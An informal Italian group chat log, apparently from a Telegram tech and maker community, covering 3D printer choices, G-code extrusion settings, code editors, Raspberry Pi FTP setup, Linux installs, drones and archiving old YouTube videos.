Vedi da quanto è la batteria
 ho visto il video su instagram della lampada Ikea...come ti sei connesso? Hai aperto il controller? O avevi un trasmettitore
Comunque pensavi di copiare esattamente il design del google home, o già che ci sei fai un design originale overvolt?
Cioè oppure fai un sondaggio per chiedere agli iscritti se vegliono la copia o il design originale
se non sbaglio era una semplicissima lampada a cui al interno ha aggiunto una striscia led controllata da swithcando con un arduino e una radio 2,4ghz
 ok peccato
Gg
Questo è niente, ci ho fatto di peggio con quello scooter 
Avevo perso le chiavi, quindi ho modificato la centralina ed ho messo l'accensione con il ble... Se metto il telefono nel cassetto si può accendere, se non c'è no
Poi ho trovato la chiave, rip
?xD
E poi parlano di veicoli autoguidati
Thiscrush css
Bazzecole
Sublime
Che poi io avevo scritto le faccine rabbiose""
Ne ho messo una decina e la codifica non gli è andata proprio a genio
Quindi tu usi TC?
Nono
Era per fare uno scherzo al.mio amico
 Dovrò farlo anch'io
Zimbadia azzigurada
Kebabo zipolla?
Prendi kebab?? Buono kebab!!
Dipende, non ti aspettare attacchi complessi, magari ha lasciato le password nei form
Tutt'al più è stato un attacco xss
Ma nulla di più
No al 95%
okay
Reperti storici
Mi consigliate una stampante 3d (decente)
Budget: 200/300€
Window-svista
Cr 10 Mini o Anet A8 compresa di upgrade pesanti
Io mi chiedevo una cosa:
Cioè se devi creare un oggetto a 2 o più colori fai come sulle macchine da cucire cioè cambi il filo appure devi avere per forza un doppio estrusore
non puoi cambiare il filo, devi avere 2 o piu estrusori
Capito
esiste anche un sistema, ma non mi ricordo di quale azienda, che utilizza un sistema simile alle inkjet
in pratica si ha un filo bianco e prima di essere estruso viene colorato con alcune cartuccie che permettono di avere quasi tutti i colori
Io una volta ho unito più filamenti in uno, con la pistola ad aria calda, ma è stato un casino calcolare le lunghezze per farlo trovare
Però funziona
Basta stoppare la stampa, cambiare filamento e farla ripartire
beh in realtà potresti, basta mettere in pausa e cambiargli il filo, ma perdi al 100% qualità, anche perchè devi dargli forza per cambiare filo, però mi sembra anche che riflashando firmware alla anet 3d ci sia qualche soluzione utile, del tipo che ti stampa un pezzo e poi quell'altro colorato e che tipo è predisposta per i multicolori, ma comunque la qualità non sarebbe buona di certo
:/

Salve, ho una domanda, conoscete un modulo per python per la gestione del wifi (connessione ad un network, disconnessione) al di fuori di "wifi"?
Vabbè, ho perso 4 ore della mia vita inutilmente 🤣
No
si èè, ma quanta malattia mentale per ciò
Poca

vabb, io vado a nerdare un po' su payday, è da molto che non faccio più una serata del tipo "gioco, mi accorgo che sono le 2 di notte, torno a giocare perchè tanto il giorno dopo si sta a casa"
come va con le stampe in 3d 
esiste un sistema automatico per questo
Alla fine ho comprato un vibratore
maa se non sbaglio stavano progettando roba tipo filamenti multicolore apposta, in teoria basta che trovi l'estrusore giusto per il multicolore ed è fatta, certo che è una figata
mi sembra valida la scelta ù-ù
nono questa taglia e risalda il filo...
una domanda
quando i ragazzi non riescono a soddisfarre XD
in questi casi la violenza è accettata?
No asp
no?
figaaaata
sai quanto costa-?
purtroppo
tipo solo 8 volte la mia stampante 3d
Calmati
Poi torturala
Certo, anche con goduria nel torturare la vittima
siamo troppo poveri
bella, la prossima è costruirmelo da me
ok
me lo faccio da solo, faccio un codice con opencv, il rasp e un fon con la bocchetta semichiusa al massimo che scioglie e riattacca i fili, e una webcam
beh...cribbio...va che sarebbe seriamente fattibile....gente.... 
a mano basta che hai uno di quei tubettini in ptfe che avanzano da dentro i nozzle, lo fai passare dentro il filo, dai fuoco con l'accendino a un filo, lo retrai dentro il tubo e ci metti subito l'altro pezzo di filo da saldare... si uniscono perfettamente
o fai così oppure ti fai il tuo Palette+ personale, io lo faccio, va che lo faccio
in teoria basta che mi prenda dati dalla stampante su tipo a che punto è e dopo gli dico "hey, ora devi attaccare" e così via
ci sta tantissimo
Non servono dati, dal gcode sai perfettamente a che punto sei della stampa, dal gcode quella prepara dove tagliare e incollarr
in teoria ti puoi preparare il filo per quella stampa dal gcode e poi far partire la stampa dopo 3 ore
si ma non è un buon metodo
Buona sera.
al massimo portalo al ristorante se ci troviamo con l'altro tizio 
Posso postare un Cicca al giorno?
Hahahahha permesso concesso
 
Il cicca del giorno
Un Cicca al giorno leva il bug di torno
devo fare più sticker (ciò implica che tu faccia più video con lui )
Lo chiameremo il cicchetto
Ciò implica che si inizi una serie di Python 
Yeah!!! 

WEWEWE FERMI
Attenzione 
ho appena realizzato che Rami Malek (l'attore di Mr. Robot) ha recitato anche in un altro film
di robot 
Notte al museo? 
python 3.7 visto che entro giugno passerà dalla beta alla release ufficiale
non mi ricordo il titolo 
sisi, solo che poi non so quanto venga precisissimo, pensavo piuttosto, come capisco quanto filamento usa fino a quel momento? è quello il fatto, per il resto è fattibilissimo
lo sai, nel gcode c'è proprio la lunghezza del filamento in ogni punto...
seriamente? c'è, non è solo un insieme di punti tutti in un file?
non avevo mai notate scrivesse pure la lunghezza del filo
HAHAHAHAHHAHAHAHA
Dipende... Cambi il filo se il colore cambia in verticale e da un livello all'altro, altrimenti ti serve un doppio estrusore
hehehe, presa da ignioranza 2.0
yep
sennò come sarebbe possibile controllare la stampa XD ogni rigo oltre alla posizione, hai anche a che posizione deve andare E estrusore
Nono ehi
a beh..effettivamente...
O che tu cambi radicalmente quella di Web
Un'altra cosa che ti volevo dire 
ee quel E tipo che valore è? nel senso, come lo ricalcolo per farlo in metri? è una grandezza in radianti o cosa?
che in radianti XD
che ne so io
più facile che siano passi, probabilmente per farla in metri devi dividere per 4e5
ma con "passi" intendi i "piedi" dei poveri o cosa?
mai sentita come unità
ahahah i passi del motore dicevo, motore passo.passo... però ci sta siano già in mm, non mi ricordo
mmhhh...no perchè vedo robe tipo 0.01436 o 0.06692 come misure su E
foto? XD
non credo siano millimetri sinceramente
Cos' è un codice per CNC?
non hai il G21 all'inizio?
con G21 imposti i mm
o beh sisi, quello è un pezzo di tutto, all'inizio c'è, si
ma c'è scritto G21 ebbasta, a capo
se mandi un gcode con E150 dovrebbe farti 15cm di filo... giuro hahahah
; ricorda di PRERISCALDARE l'ugello o non partirà il comando di estrusione!!

G21
G90
G92 E0
G1 E150 F200 ;verifica stampa 15cm
M400
questo serve a vedere se la stampante non sbaglia e stampa davvero 15cm
ok si, è in millimetri proprio, anche guardando il codice d'inizio che avevo preso su internet, c'è scritto "E3 ;extrude 3mm of feed stock", quindi già in millimetri
e tra l'altro F per cosa sta?
velocità
a, per Feed Rate?
sattoh, thx
tipo lì 200mm/sec... uno sbotto hahah
se la vuoi distruggere
io nel mio codice all'inizio ho un F9000 su Z... :D
ottimo
ho paura
ascensore senza cavi
è una di quelle poche volte in cui la mia sanità mentale potrebbe prendere il sopravvento sulla mia tendenza a fare cose stupide.... potrebbe solo però
ci sta
cmq F nel mio codice sta sempre su 1500, 1900, e valori così
Perché? :(

usa abs ._.
e poi...che modello hai fatto giusto per sapere?
Hanno attaccato eh
Però guarda che schifo
ma comunque tipo tutti quei punti in cui non è specificato E?
usato dell'abs juice?
Ho usato abs
Con ABS juice
Ehhh
Si
Questo
hai messo un'altezza layer esagerata mi sa
inviami il modello che gli do' una riguardata ai settaggi che hai messo
pare giusto
Up

prima magari mettili in modo che fisicamente possano essere stampati senza che coli la vita
Se li metto orizzontali si staccano
perchè secondo te così si stampano? ma dove vivi
ma manco sulla iss
coi supporti si stampano
beh ma...perchè
considera che sti affari sono piccolini e sottili
non si staccano proprio
va che sbagli qualcosa, se hai usato abs juice e lo hai fatto abbastanza denso allora il problema è che è troppo alto l'ugello dal letto
vai tranquillo
mmm
non lo so
considera che c'è talmente tanto adesione adesso che manco usando il wd 40 si staccano 
è normale, così deve essere
vuol dire che lo fai giusto
si si
però se non si stacca è un problemone
comunque...inviami un progetto dei tuoi quando puoi, che do' un'occhiata e ti dico subito se il problema sta li o dove
naah, ci sono molte soluzioni, io ci vado di spatola a mazzate, alla fine si stacca
comunque l'abs non lo spacchi, siano pezzi grandi o piccoli puoi darci tutta la violenza che vuoi ma è difficile da rompere
ma sono piccoli
si deformano
naah
mai successo
deformare abs non so come fai, avrai del filamento scadente
dopo provo
È un fisso....
Tipo 50cm per 20 com per 80cm
Gli utenti xiaomi fanno un po' schifo se è così 
Io ho i miei 300 passi giornalieri
Miii caricare il miband
Anche te 30000 passi al giorno?
EH lo ho scarico da gennaio
E non trovo il caricacoso
In periodo rami pure io. Nelle giornate normali no xD
Scusami, ora non ti consiglio più la Cr10 mini, al contrario, mi raccomando di non comprarla con l'idea di non dover spendere altri bei soldini per farla funzionare come dovrebbe. Vai di Anet A8 upgradeata e sarai molto più soddisfatto di quanto potresti esserlo con la cr 10 mini
la hai appena volata dalla finestra?
C'è andata vicina
perché? 
È 1 ora che tento di svitare due vitine di merda
solo perché non hai gli strumenti non è colpa della stampante
Costa tanto di più farle bene da subito e non dover tirare giù i santi?!
serve quello suo 
sinceramente... la mia va benino 
Gli strumenti erano insieme alla stampante, poi sono ancora andato a prendere un kit torx come diceva Ric e cacciaviti vari, ma sono sempre lì quelle due vitine
Sono io lo sfigato allora
ma cosa gli vuoi fare
Cambiare la vite godronata perché quella in ottone originale si è già consumata...
succede è ottone... dovrò comprarle anche io
nemmeno io ho il cacciavite per svitarla cmq
Mi sono arrivate oggi quelle nuove e volevo cambiarla un attimo... 1 ora e non ho svitato nemmeno una vite
Si usano le brugole in dotazione
è una vite, loro la hanno avvitata, se non è lesionata deve andare, vuol dire che non hai lo strumento idoneo
Io ho due viti a brugola
ci sono varie scale di misura, è probabile non sia metrica
Ma nemmeno con le brugole in dotazione?!
no, io non la ho in dotazione
Come no?
non quella per svitare quella brugola, è una serie diversa mi sa
ho capito, mica sono tutte le brugole che esistono queste XD
Sono tutte quelle della stampante
evidentemente non tutt
La brugola piccola l'ho già usata per la vitina dell'hotend, che è identica a quelle della ruota godronata e andava bene
che figata
Ehm
Possibile che debba andare a prendermi un kit apposta per due vitine delle balle
Ho appena svegliato i miei cantando Man's No Hot 🤦‍♂
(quella che fa "THE THINGS GO SKRRRRAAA")

e non hai la chiave sì XD
Domani vedo se riesco a tirarle via facendo di misura un cacciavite a taglio
Altrimenti seriamente ci vado di trapano
cioè vuoi buttare seriamente stampante
No no, buco quelle due viti e cambio la ruota godronata
Non lo fare...
Perché?
Tipo quella su Amazon è ugradeata?
Come funziona?
Buon 25
Se mandi un link, la mano applica il referral di overVolt e lo accorcia
No, prendila su gearbest o banggood insieme ad un buon frame e alcune altre cose che ora non ti so dire, ma ti faccio sapere
salveee
che bello dormire una volta tanto
.-.
poi vabeh, io che sono sveglio dalle 6:00 a lavorare su un plugin spigot 
Visto? 
ah no è sempre la mano..
ahhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh
Quando tua madre è una stampante
Ma quale delle due è la mano destra e quale è la sinistra? 
La ha programmata cicca 
È bella per forza
Ma quindi?
Eh dipende da cosa ci fa marco
Se usa i referral per scrivere e la giustizia per impugnare lo scudo... O viceversa
la mano della giustizia è lo scudo contro gli shitstorm 

Scusate, io ho un drone parrot ma è molto instabile. Potrebbe essere dovuto alle riparazioni con lo scoch sulla carenatura(credo si chiami così)?
quando hai appena reinstallato windows
togli pure atom, l'ho trovato inutilmente pesante
Fillooooooo vieni che mi servi 
Come si installa l'ftp su un raspberry?
ti capisco
ma é utile, é integrato con github, può usare ftp senza avere i file offline, ha quasi tutti i linguaggi dentro
1 secondo
basta che apri la porta sul router e la usi, dovrebbe andare, oppure serve installare un programmino da apt-get, non ricordo🤔
come ogni altro ide immagino, non so, preferisco eclipse che pesa di più come ram piuttosto che atom che mi si bloccava senza motivo e aveva bisogno di plugin per le cose più banali
 oplà
Anche se lo usoin locale?
se lo usi solo in locale non serve aprirla
già, beh in locale non serve aprire la porta
VSCode >>> Atom
Gente ho trovato una Sony  a6300 nuova italiana a 750€, è l'acquisto della vita?
non bestemmiamo...
per ora sto provando brackets che è tipo atom ma ha più difetti, tipo che devi smanettare per dirgli di non cagarti il cazzo con degli errori inesistenti che vede solo lui
Manda foto
Cosa è spotify converter
VSCode è mooolto meglio, anche solo per intellisense
Registra Spotify
Desktop o terminal?
Ma fai prima con DeerLoader
Se hai raspbian devi sono attivarlo:
Sudo raspi-config
Entri nel menu e vai sul opzione interface settings e ti uscirà ftp clicchi e fai enable
Ma non l’hai creato tu?
ok stai trollando
ovviamente stai trollando
il canale sì
Okay per me VSCode è fatto bene, te spiegami perché no
Perchè è fatto da Microsoft
perché la microsoft è incapace di sviluppare qualcosa in maniera decente, figuriamoci farla meglio degli altri
è proprio scritto nel regolamento: do it stupid, stupid
Secondo voi cosa è?

(Non è un culo)
Pure a me da fastidio Microsoft, sono il primo che nella vita quotidiana usa solo Linux, però dire che VSCode è fatto male a prescindere dicendo che è fatto da Ms non mi pare corretto 
il tuo culo e per questo ti bannerei
ma anche dire che è fatto meglio di altri ide non lo è, magari è fatto bene, ma dubito sia meglio della concorrenza
No
Fermi non è quella parte del corpo
Tutto quello che fa ms è na merda
Windows
Explorer
Edge
Windows Mobile
Devo andare avanti?
io metterei anche xbox visto come la stanno gestendo facendosi concorrenza da soli
Yep pure io
Guarda che ti sto dando ragione, sul mio pc ho persino tolto il dualboot e ho lasciato manjaro
Ma ciò non significa che anche VSCode è fatto maleee
io no, ho il dualboot con windows 10 che non ho mai avviato e windows 8.1 che non avvio da dicembre 
dovrei cercare la forza di volontà per avviare windows 8.1 e fare tutti gli update di questi mesi
Non farlo
Devo, per usare un programma che c'è solo su Windows, crasha su wine ed è troppo poco importante per meritarsi del tempo per farlo funzionare su wine
Riscrivilo
Non ora, magari quando mi andrà di fargli concorrenza
Se è in C# o Java ci metti 2 minuti a decompilarlo
Ok ma non ha molto senso
Comunque ci perderei del tempo
qualcuno ha mai usato 
?
Nope
Ho evidenziato i punti che ho riparato con lo scoch
Potrebbe essere per le riparazioni?
Che bello... vola?? Ha la cam?
La cam la ha
Il problema é il volo perché sembra che abbia vita propria
In che senso?
Fa tutto da solo
Mi si é schiantato un paio di volte per questo quindi chiedevo se c'era modo di aggiustarlo perché é ingovernabile
Perchè se visualizzo questa pagina web da Chrome mi viene fuori questo riquadro. Invece da Firefox si vedono delle. Gif
Quale hai? Io ho perso il la 1s. Se vuoi ti spedisco il caricatore
Chi ha sentito il terremoto ?
Quando è avvenuto?
Tipo 40 minuti fa
Nelle Marche
Ma io lo ho sentito qua in Molise
2
Trovato ieri sera
Qualcuno ha Eolo? Se sì: come vi trovate? 
Ho appena eseguito il test di copertura e ho scoperto di essere coperto dalla 100mbps. Ora come ora ho ancora il doppino telefonico e per installare i cavi della fibra ottica dovrei pagare 400€ al mese di ilc
La gioia del miband carico... Adesso rompo le palle a marco 
Io sono di Trento
Ergo non ho sentito niente
Io ho la casa antisismica...
Ok 
Però lo ho sentito forte lo stesso
Ah beh
Sarebbe stato molto preoccupante il contrario
 te lo hai sentito?
Tu sei delle marche?
No sono in Molise
Qualche idea su come sistemare?
Ma nooo
Un terremoto 4.2 Richter a 800 km di distanza figurati
Io ho solo sentito l'urlo del mio coinquilino che ha preso la scossa e fatto staccare il differenziale
Ho sentito quando c'è stato quello in Emilia Romagna ma sono 200km ed era un 6.1 Richter
Nah coi droni non vado troppo d'accordo 
Vi è arrivata la nuova grafica di Gmail?
E si inizia con le notifiche del video 

e poi ci sono io in abruzzo che non ho senito un beneamato cappio 
No, nel Molise
4.6
angurieee 
Nessuno?
Prova a usare meno scotch o altrimenti usa del nastro carta
Lol
Domanda: perché una pagina in download su Chrome mi fa schizzare la CPU al 100%?
Succede
Con Mozilla fa la stessa cosa?
Solo a tenerlo aperto uso il 2,6%
Firefox non sembra
Devo iniziare ad usarlo di più
Ciao, ho un problema, il mio ISP non mi permette di avere un IP pubblico, ho in mente un progetto che implica l'utilizzo di ifttt con Google Assistant e il Maker channel, conoscete un servizio al di fuori di dataplicity che permette di fare questo senza IP pubblico? Grazie
Compro una nuova carenatura?
È impossibile non avere un IP pubblico
Purtroppo se abiti in campagna l'unica alternativa è Linkem o Eolo. Linkem ha una rete nattata e quindi niente IP pubblico
Ma che ca
Come fai ad usufruire del servizio?
In pratica siete tutti sotto lo stesso ip pubblico?
un bot clone di grouphelp puo avere delle implementazioni come servizi di ifttt?
Esatto
che minchiata
ci sarà pure un modo per identificarti
Non lo so
Non prendere troppo sul serio i miei consigli, ma prima di comprare prova a usare il nastro carta e usane poco
nope
Crea un altro bot
ragazzi,ce un prog chiamato handbreak il mio pc e 32 bit quindi non puo aprirlo,ma come dice ottimizza il video senza perdere la qualita .-.
e...?
Ragazzi, ho questo problema e non so cosa fare; sto installando kali da usb
bo 
cerca su internet, vedi subito cosa fare, comunque se non funziona usa un disco per installare, a me aveva risolto tempo fa, ma evita kali in generale, piuttosto metti la distro che vuoi e poi installi i tool di kali dal gestore pacchetti se ti servono
Ok
Riavvia
Formatta la USB
Scarica la iso di Debian
Installa Debian
Ok
Quale uso come iso di debian?
dipende dal tuo pc
Amd fx 4300 64 bit
allora fai amd64
dvd
Il caricamento senza quell'orrenda barra blu
Ho provato senza ed é perfetto
Chi mi aiuta  a scuola dobbiamo creare un app per Samsung
app di che tipo'
?
Quello che ci viene in mente si può fare
Qualcuno di voi ha Eolo?
Dato che ho ancora il doppino telefonico vorrei installarl poi fino al 30 di aprile l'installazione è gratis
Mai sentito come sistema operativo
Ho già fatto e il test e sono coperto dai 100mbps
(50 volte ciò che ho ora)
Web App o App Nativa Android?
App nativa con app inventor
 hai seguito la presentazione del 5G nell'evento del IEEE? (lo speaker è un insegnante della magistrale di telecomunicazioni di unitn tra l'altro)
2
Sto male per quello che ho detto
puoi usare admob
Una roba semplice che mi viene in mente è far comunicare l'Applicazione con le HTTP API di OpenWeatherMap
Quando ho finito il corso di 9 lezioni ci provo
Devi usare l'elemento Web se non sbaglio
A me non ancora sad
Devi andare nelle impostazioni in alto a destra e su "Try the new Gmail"
Comunque gg a Google
Ma si attiva a mano
Ah non avevo letto kek
Fiko
ma che è successo con gmail ?
Hanno rinnovato la grafica
ha wow !
Daje col defrag
Io ho ancora quella vecchia...
Devi attivarla a mano
^
\a in c++ dà il bell, ma non l'ho mai provato
Ah capit
Eh non mi esce ancora
CTRL+F5, pulisce la cache
Nuu davvero?????
Ctrl-f5 pulisce la cache? 
Io l'ho fatto prima di tutto
Mai saputo
Quindi non saprei
Eh no la cache la ho pulita pure io
Ma non sapevo la shortcut
qualcuno può passarmi il quinto, il nono e il decimo episodio di mr.robot in italiano?
openload è andato down
non mi scarica più le cose
"questo non sono io", ai lov russo
Lol ahahha
giusto, sei ucraino no?
già
Друг
ciao anche a te amico
Uh quindi Друг = ciao...
In russo?
E io che ho messo 39 estensioni per pulirla....
no, "amico"

Ma siete sicuri? CTRL+F5 a me ricarica la pagina, non la cache
anche la cache, anche quella, poi è chrome che è scemo di solito
Può essere anche la cache lato server eh
Per quella puoi aspettare e basta
Ai motori che mi hai consigliato hai dovuto fare qualcosa o hai preso e collegato al ponte?
colleghi
Perfetto
Gli rispondereste voi per favore?
Terza stagione?
Te li invio qui o in chat?
questo manco sa cosa dice in inglese
maa c'è, per me è tutto buon materiale per iGNUranza, non so voi
Lascia stare, che lui usa Telegram per guadagnare tramite bot e canali che minano bitcoin e glieli regalano solo con dei giochi in chat
genio
Eh il profumino è quello
Egregio Signore, Telegram non è solo per i bimbi poco cresciuti. È per chi ci tiene alla propria privacy, per aiutarsi l'uno l'altro, per chi vuole un'applicazione di messaggistica completa e funzionale e per chi sostiene l'Open Source (poi che tu non sappia cosa voglia dire, vabbè).
Quel mondo dei "pikkoli akerz" e del porno/gore lo puoi beatamente evitare. Tutto dipende dall'individuo.
ma telegram è un social, non è solo messaggistica, c'è dai
Telegram è tutto
voglio dire...ci sono i gruppi di lamer che entrano in gruppi a rompere, ci sono i trollini, ci sono gli infiltrati in altri gruppi con i peggio voip, ci sono i buongiornixximi cafckheèèèè
cosa vuoi di più
Il confine tra social e app di messaggistica è sottile, perchè la prima ti fa pubblicare i tuoi dati liberamente, la seconda no. Telegram si trova fra le due.
Ragaa! Mi sono appena ricordato che la lista di Giramerda con cui avevo acquistato è chiusa, fallita! Posso finalmente cambiare nick!!
Come ho detto, si possono evitare tranquillamente
uau
ma io non li voglio evitare, sono la parte più bella
Uno di questi viene a scuola con me e si chiama @Ehu...ehm...
Ahahahahahaah
Consigli girada?
Assolutamente no è da 1 anno e 1 mese che aspetto di ricevere una nikon d5300
Appena posso faccio il riscatto a prezzo di mercato
O meglio... Appena si può
Sono andati a prendere il silicio sul Himalaya?
Chiedi a quello della lista girada inforge che tutto d'un tratto è sparito e ha venduto il gruppo ad un altro shop simil girada
Non ci ho mai comprato da girocoso, però ho comprato da altri siti... Che facevano ponzi
 
Ti è mai arrivato qualcosa?
Sempre tutto
🤣
Tu hai troppo culo, lasciatelo dire
O sono io troppo sfigato
Il mio g2 pagato 180€ è arrivato in quel modo
Quando compri il Pc su aliexpress da un terzo rivenditore
Arrivava anche la fattura del fornitore che lo pagava lui 280€
Ah...
Figa la 1900 Ti!!! Mandaci i bench! La batte una 710?
Batte un crossfire di 4 CPU quantistiche
Per questo ho preso l'alimentatore da 9000W
Porca bestia!
Questo dettaglio non l'avevo notato
Tornando seri... Dentro c'è un mattone?
"""""tornando seri"""""
Fake
Gli invidiosi diranno photoshop
Invidiosa
Solo perché io ho una 1900Ti
Sono femmina
Ahia, questa non me l'aspettavo
E comunque io ho una Titan Xp :)
Mi hai preso a difese abbassate
Ce l'ho nella cantina di mio cugino
Ormai è passata di moda...
Non lo sopporto più
and 
'inglesedim*rda
Cheppalle app inventor... A scuola fortunatamente l'ho finito già 3 mesi fa
Madonna infatti
È più divertente algobuild
No lo dobbiamo finire per domani e
Mi mancano 4 video

ma ho messo il ref dal bot in privato
 ma controlla il bot se il Ref è di marco?
20000€
Non è un po tantino?
No ci sta, dai!
Si ma tanto lo prendono solo i bimbi che vogliono un pc, perche più costa più è potente!!!!!!
Fossero stati 18000 sarebbe stato meglio, ma è comunque un buon prezzo!

Io avrei messo un i7 8700 se c'è
In che senso se c'è?
Non so se hanno prodotto l' i7 8700 per portatili
Ma è un palese b8
Nessuno lo compra
Ci stanno pure i cavi coassiali a 300K €
Per me non è un problema
Dite che ha problemi di temperature?
Design interessante
potrebbe, non è detto che "+ ventole = - temperatura"
Eeeh piccolo bug  dimenticato il case-sensitive
esatto

Ops
Troppo silenzio.... Strano
Vero?
^ripropongo rivolto a tutti
Cos'è unitn?
UNIversità di TreNto
Università di trento
Ah ok
ci sono posti dove c'è a fatica il 3g e pensano già al 5g.....
Io ho 5mbps 
Si parla di innovazione tecnologica, non di applicazione pratica della tecnologia, che sono solo problemi dovuti agli isp e gestori
pere è innovazione tecnologica anche abbassare i costi dellentecnologie già presente e ottimizzarle imvece di sviluppare qualcosa di nuovo (sicuramente utile)   che però richiede muove infrastrutture e quindi costi maggiori di quelli che andrebbero già affrontati per rendere decentu le reti in italia e non solo
Comunque purtroppo non sono riuscito a seguire tutta la conferenza, ma da quel che ho visto sarà proprio una rivoluzione sia come prestazioni che come struttura della rete e delle delle applicazioni che la utilizzano
Eh sisi sarà una rivoluzione
Io ho letto qualche articolo qua e là senza dedicare troppo tempo...
Conviene passare a una tecnologia piu recente che ottimizzare tecnologie vecchie allo stesso costo economico
L'unico miglioramento possibile senza investire in hardware è quello del modificare un protocollo di comunicazione standard (e quindi nessuno lo modificherà per ovvi motivi)
Ah no non ho visto
Peccato, forse si riesce a recuperare la registrazione
Mi piacerebbe anche a me dare un'occhiata... Neanche sapevo ci fosse 
Benvenuto!!
Buongiorno a tutti!
Grazie
Qualcuno conosce un cloud illimitato?
Penso che un servizio cloud illimitato non lo offra nessuno, ma se paghi abbastanza puoi avere un servizio cloud molto grande
Pensavo avesse i9
telegram
Effettivamente 🤔
Ho già caricato 50TB ma ho paura di incorrere in un ban
Nah
Madonna... Ma cosa hai caricato di cosí pesante?
invialo a un altro profilo fatto con un voip così hai un backup caso mai
Hai presente marcuskron? Tutto il suo canale pesa 4TB
Ho il backup di molti canali italiani
E? Che senso avrebbe scaricarsi un paio di centinaia di video e caricarli su un cloud se già yt di per se è un cloud dedicato a video?
Perché keledan75 ha reso privati tutti i video vecchi, che io mi guardo periodicamente...
Ho ancora tutti i video xD
Coooosa
🤷‍♂ non ha senso ne quello che fai, ne rendere privati i video vecchi
Domenica sono lì, gli riferisco che c'è qualcuno che tiene ai vecchi video di minecraft hahah
Ovviamente non li condivido, me li guardò ogni tanto xD
non è l'unico, erano bellissimi quei video
Ahaahahaahahahah
Un po’ come ricordo... cloudcraft
Ma li ha tolti per dare una determinata direzione al proprio canale, non perché non voleva che fossero più visti 
Anzi, io li avrei ricaricati pubblici su un canale secondario, fossi in lui
Dimmi che hai l'ultima puntata della skyfactory 2.5 
Dici che dovrei eliminarli?
Infatti io me li tengo solo perché mi ricordano un periodo della mia vita.. un po’ come le canzoni
Non penso l’abbia mai caricata ahaha
2.5, non 1
Nono al contrario, non c'è nessun problema ad averli
L'aveva pubblicata ma poi l'ha tolta perché si sentiva shifty che gli faceva un particolare servizio orale


Se l’ha messa dopo il 2013, la ho
Ho un programmino che ogni ora scarica i video nuovi
Tekkit col tubo... che ricordi
Cos
come si chiama?
Eheeheh
Non l’ho ancora rilasciato 
è tuo?
Yep, scritto in Java.. scarica, comprime e carica su ftp
Coosa 
Ma ahahahaahahah
Siamo matti
Ti pare che facevo tutto a manina?
Ahahah
E quali canali stalkeri?
Ciaooo
Tutti quelli che partecipavano alle vecchie serie Minecraft... i video nuovi non li guardo ahaha
Vecchie quanto vecchie? Tipo Luke, randy, darkhim, chip, ecc?
Minefriend, tekkit col tubo, fapcraft, technocraft, cloudcraft.. tutte le vecchie serie moddate con quello di toms nella 1.2.5, 1.6.4 ecc
Video da 50 minuti
Quanti hard disk hai?
Quanta voglia hai?
NAS 48TB
I ricordi valgono tanto
A me era venuta in mente una idea... Utilizzare ownCloud e fare un plugin che si "connette" a teelgram visto che telegram permette di condividere illimitati file da max 1,5gb in questo modo uno carica su ownCloud un file che viene automaticamente riversato su un account privato di telegram...
O.O
tante bestemmie 
lol
io direi "il posto in cui incontro cicca e romboli a caso per i corridoi o in mensa"
poi il fatto che lo studio porti a sclerare è l'altra faccia della medaglia
non c'è bisogno di nuove infrastrutture per il 5G, basta aggiornare le antenne..i tralicci e la dorsale in fibra rimarranno quelle
maria che palle quel canale, una lagna continua, sempre che si lamenta per ogni cosa..non so come cavolo facciano a sopportarlo quelli di Tom's🤔 penso soltanto per lo stipendio
ingegneria=pazzia..lo vedo tutti i giorni negli occhi della mia fidanzata
eh... io sono perennemente stanco, a volte la gente pensa che sia drogato o che li guardi male... ma non è colpa mia se necessito di 9+ ore di sonno ma ne dormo se va bene 7
lo dici a me che mi corico quasi sempre alle 2-3 e mi sveglio alle 7, 7 e mezza? perennemente irritabile
il caffe a me non fa piu nessun effetto....
sei assuefatto
eh... probabilmente si... ed è bastato relativamente poco tempo....
con quella vita e quegli orari è normale
I video nuovi non mi piacciono, ma quelli vecchi me li riguardo sempre
Hahah tu ce l'hai proprio a morte con robertone
Anche io 
Ma non faccio testo 
In realtà è simpatico se lo conosci, secondo me dà un'idea un po' sbagliata sul canale perché non ci si impegna più di tanto (ma ci sta anche, quello è un passatempo da pausapranzo... Ha roba ben più importante da fare immagino)
Zitto tu che odii tutti gli youtuberz 
Ecco
Tutti tranne marco
A me non lascia niente
non è che ce l'ho a morte con lui, si vede che sa quello che fa e che ne capisce di recensioni..il fatto è che si lamenta per ogni cosa, è sempre polemico e parla con atteggiamento incazzoso..e il pubblico questo lo nota
Ragazzi il mio solito fornitore mi ha lasciato a piedi sto giro, non tiene più la Multicore.
Consigli per dello stagno in pasta?
per smd?
stagno liquido oppure pasta saldante?
Differenze? Io lo conosco come stagno in pasta
lo stagno in pasta è un mix di stagno e piombo, la pasta invece serve a disossidare
Nono a me non serve del flussante, serve dello stagno in pasta
La Multicore che usi tu è quella della Loctite, giusto?
Henkel ma si, sempre loro sono
io come pasta salda o flussante uso Weller, La-Co e Kemper, li trovi su Amazon volendo
se invece vuoi la Multicore, ti mando un sito dove dovrebbero averla, però come prezzi non so se sono buoni, mai usata..regolati tu in base alle tue fatture
Vista. Stesso prezzo di RS cioè più o meno il 20% in più di quanto la pagavo io (senza contare la spedizione)
Qualcuno mi potrebbe aiutare con un esp8266? Non riesco a programmarlo
Hai qualche link, non riesco a trovarla la weller
certo, te li mando subito
Ma questo è flussante
infatti, ho scritto pasta salda o flussante su :)
No ho chiesto stagno in pasta non flussante ahah
vedi questo..ma non l'ho mai usato
?
Mi da inserzione rimossa.
Grazie comunque, adesso sento un po' in giro
ci sarebbe anche quella della Baku
Praticamente a gratis
HAHAHAAHHAAHAHAHAHHAHAAHHAHA
HAHAHAHAHAAHHAHA rido troppo

Eccomi...
Si scrive python.
Anzi,meglio di no, al momento ho altro da fare e 10 euro son pochi, altre cose fruttano bene invece
 è spam
spam è un'altra cosa... non so se si possa warnare
Ragazzi idee di magliette fisico-scientifiche da far fare?
Pure tu sei spam, le contrattazioni non si fanno qui
Non lo sapevo
Scusate

Spam di volere gente
Quindi è spam
Ma non ho pubblicizzato nulla...
Cos
Infatti ho solo detto che sto pieno di lavoro
Bannnn
Pls
Non mi piace neanche a me spammare...
Ok
Non penso abbia fatto pubblicità
Posso aiutarla qui o in privato?
Scegli tu, forse in privato è meno dispersivo
Raga mi sa che mi stanno hackerando in qualche modo
Mi è arrivata un mail di outlook di un accesso anomalo in Russia (secondo me è 100% un proxy), ma quell'email lì la utilizzo quasi mai
